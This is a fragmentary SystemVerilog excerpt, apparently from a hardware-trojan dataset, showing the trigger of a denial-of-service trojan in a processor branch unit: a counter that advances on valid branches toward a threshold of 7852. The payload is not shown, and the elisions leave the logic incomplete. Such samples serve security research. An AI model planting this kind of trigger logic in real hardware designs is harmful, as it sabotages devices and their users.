...
module branch_unit_trojan_DoS #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=7852)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 7852;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (branch_valid_i) trojan_counter <= trojan_counter + 1;
